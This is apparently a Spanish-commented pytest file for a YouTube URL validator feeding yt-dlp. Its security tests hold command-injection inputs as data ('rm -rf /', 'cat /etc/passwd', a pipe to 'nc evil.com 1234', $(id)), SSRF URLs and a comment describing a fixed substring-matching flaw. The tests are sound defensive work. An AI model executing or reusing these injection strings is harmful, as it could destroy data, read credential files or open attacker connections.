"""
validate_youtube_url() e is_search_query().

Es la puerta de entrada de todo el backend: lo que pase de aquí acaba en una
línea de comandos de yt-dlp, así que conviene tenerlo bien amarrado.
"""

import pytest


# ========================================
# Vídeos normales
# ========================================

@pytest.mark.parametrize("url,expected_id", [
    ("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ"),
    ("http://www.youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ"),
    ("https://youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ"),
    ("https://m.youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ"),
    ("https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s", "dQw4w9WgXcQ"),
    ("https://www.youtube.com/watch?v=dQw4w9WgXcQ&feature=share", "dQw4w9WgXcQ"),
])
def test_video_urls(srv, url, expected_id):
    content_type, content_id = srv.validate_youtube_url(url)
    assert content_type == "video"
    assert content_id == expected_id


@pytest.mark.parametrize("url,expected_id", [
    ("https://youtu.be/dQw4w9WgXcQ", "dQw4w9WgXcQ"),
    ("https://youtu.be/dQw4w9WgXcQ?t=30", "dQw4w9WgXcQ"),
    ("http://youtu.be/dQw4w9WgXcQ", "dQw4w9WgXcQ"),
])
def test_short_domain_urls(srv, url, expected_id):
    content_type, content_id = srv.validate_youtube_url(url)
    assert content_type == "video"
    assert content_id == expected_id


def test_video_id_with_underscore_and_dash(srv):
    """Los IDs de YouTube admiten guion y guion bajo: no deben partirse."""
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/watch?v=a_b-c1D2e3F"
    )
    assert content_type == "video"
    assert content_id == "a_b-c1D2e3F"


# ========================================
# Shorts y YouTube Music
# ========================================

def test_shorts_url(srv):
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/shorts/dQw4w9WgXcQ"
    )
    assert content_type == "shorts"
    assert content_id == "dQw4w9WgXcQ"


def test_music_watch_url(srv):
    """music.youtube.com/watch encaja antes con el patrón genérico de watch."""
    content_type, content_id = srv.validate_youtube_url(
        "https://music.youtube.com/watch?v=dQw4w9WgXcQ"
    )
    assert content_type in ("video", "music")
    assert content_id == "dQw4w9WgXcQ"


def test_music_playlist_url(srv):
    content_type, content_id = srv.validate_youtube_url(
        "https://music.youtube.com/playlist?list=PLabcdefghij"
    )
    assert content_type == "playlist"
    assert content_id == "PLabcdefghij"


# ========================================
# Playlists
# ========================================

def test_plain_playlist_url(srv):
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/playlist?list=PLxyz123"
    )
    assert content_type == "playlist"
    assert content_id == "PLxyz123"


def test_watch_url_with_list_is_playlist(srv):
    """Un vídeo dentro de una playlist se trata como playlist, no como vídeo."""
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=PLxyz123"
    )
    assert content_type == "playlist"
    assert content_id == "PLxyz123"


def test_mix_playlist_is_recognised(srv):
    """Las Mix (RD...) se aceptan como playlist; el tratamiento especial va aparte."""
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ"
    )
    assert content_type == "playlist"
    assert content_id.startswith("RD")


def test_playlist_takes_precedence_over_video(srv):
    """El orden importa: list= gana aunque la URL lleve también v=."""
    _, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/watch?v=aaaaaaaaaaa&list=PLreal"
    )
    assert content_id == "PLreal"


# ========================================
# Entradas inválidas
# ========================================

@pytest.mark.parametrize("url", [
    "",
    "no soy una url",
    "https://vimeo.com/123456",
    "https://example.com/watch?v=dQw4w9WgXcQ",
    "https://www.youtube.com/",
    "https://www.youtube.com/feed/subscriptions",
    "https://www.youtube.com/@canal",
    "https://www.youtube.com.evil.com/watch?v=dQw4w9WgXcQ",
])
def test_invalid_urls_return_none(srv, url):
    content_type, content_id = srv.validate_youtube_url(url)
    assert content_type is None
    assert content_id is None


def test_non_http_scheme_never_reaches_the_validator(srv):
    """
    `ftp://youtube.com/watch?v=...` engaña al validador (devuelve 'video'),
    pero no es explotable por la API: is_search_query() lo desvía a búsqueda
    porque no empieza por http/https. Se deja documentado el camino real.
    """
    assert srv.is_search_query("ftp://youtube.com/watch?v=dQw4w9WgXcQ") is True

    query, content_type, _, _ = srv.resolve_download_input(
        "ftp://youtube.com/watch?v=dQw4w9WgXcQ"
    )
    assert content_type == "search"
    assert query.startswith("ytsearch:")


def test_video_id_too_short_is_rejected(srv):
    """Los IDs de vídeo son exactamente 11 caracteres."""
    content_type, _ = srv.validate_youtube_url("https://www.youtube.com/watch?v=abc")
    assert content_type is None


def test_video_id_too_long_is_truncated_or_rejected(srv):
    """Un ID de más de 11 caracteres no debe colarse entero."""
    content_type, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/watch?v=abcdefghijklmnop"
    )
    if content_type == "video":
        assert len(content_id) == 11


# ========================================
# Seguridad: nada de lo que entre debe poder inyectar
# ========================================

@pytest.mark.parametrize("url", [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ; rm -rf /",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ && cat /etc/passwd",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ | nc evil.com 1234",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ`whoami`",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ$(id)",
])
def test_shell_metacharacters_do_not_reach_the_id(srv, url):
    """
    El ID extraído sale de un regex restringido a [a-zA-Z0-9_-], así que los
    metacaracteres de shell nunca forman parte de él.
    """
    _, content_id = srv.validate_youtube_url(url)
    if content_id:
        assert all(c.isalnum() or c in "_-" for c in content_id)


def test_playlist_id_charset_is_restricted(srv):
    _, content_id = srv.validate_youtube_url(
        "https://www.youtube.com/playlist?list=PL_abc-123;evil"
    )
    assert content_id == "PL_abc-123"


# ========================================
# SSRF por validación de subcadena — CORREGIDO (plan 02, T9)
# ========================================
#
# validate_youtube_url() usa re.search(), que encuentra el patrón en CUALQUIER
# posición de la cadena en lugar de validar el host. Una URL de un dominio
# ajeno que contenga "youtube.com/watch?v=<11 chars>" pasa la validación, y
# resolve_download_input() devuelve la URL COMPLETA del atacante, que acaba
# como argumento de yt-dlp: el servidor descarga de donde le digan.
#
# Sin autenticación ni rate limiting en /api/start-download, cualquiera puede
# hacer que el VPS haga peticiones a URLs arbitrarias.
#
# Arreglo: usar urlparse() y comprobar netloc contra una lista de hosts
# permitidos (youtube.com, www.youtube.com, youtu.be, music.youtube.com, ...).
# Pertenece al plan 02 (endurecimiento de seguridad del backend).
#
# CORREGIDO en el plan 02 T9: `is_youtube_host()` valida el host con urlparse
# antes de mirar el patrón. Estos tests pasan a proteger de regresiones.

@pytest.mark.parametrize("url", [
    "https://evil.com/?x=youtube.com/watch?v=dQw4w9WgXcQ",
    "https://atacante.es/youtube.com/watch?v=dQw4w9WgXcQ",
    "https://192.168.1.1/youtube.com/watch?v=dQw4w9WgXcQ",
    "https://localhost:8080/youtube.com/watch?v=dQw4w9WgXcQ",
])
def test_foreign_host_must_be_rejected(srv, url):
    content_type, _ = srv.validate_youtube_url(url)
    assert content_type is None, f"Host ajeno aceptado como YouTube: {url}"


def test_attacker_url_must_not_reach_ytdlp(srv):
    evil = "https://evil.com/?x=youtube.com/watch?v=dQw4w9WgXcQ"
    with pytest.raises(srv.InvalidInputError):
        srv.resolve_download_input(evil)


# ========================================
# is_search_query
# ========================================

@pytest.mark.parametrize("text", [
    "bad bunny",
    "beethoven sinfonia 9",
    "  texto con espacios",
    "youtube.com/watch?v=abc",       # sin esquema: es búsqueda
    "www.youtube.com",
    "123456",
])
def test_plain_text_is_a_search(srv, text):
    assert srv.is_search_query(text) is True


@pytest.mark.parametrize("text", [
    "http://youtube.com/watch?v=dQw4w9WgXcQ",
    "https://youtube.com/watch?v=dQw4w9WgXcQ",
    "https://cualquier-cosa.com",
])
def test_urls_are_not_a_search(srv, text):
    assert srv.is_search_query(text) is False
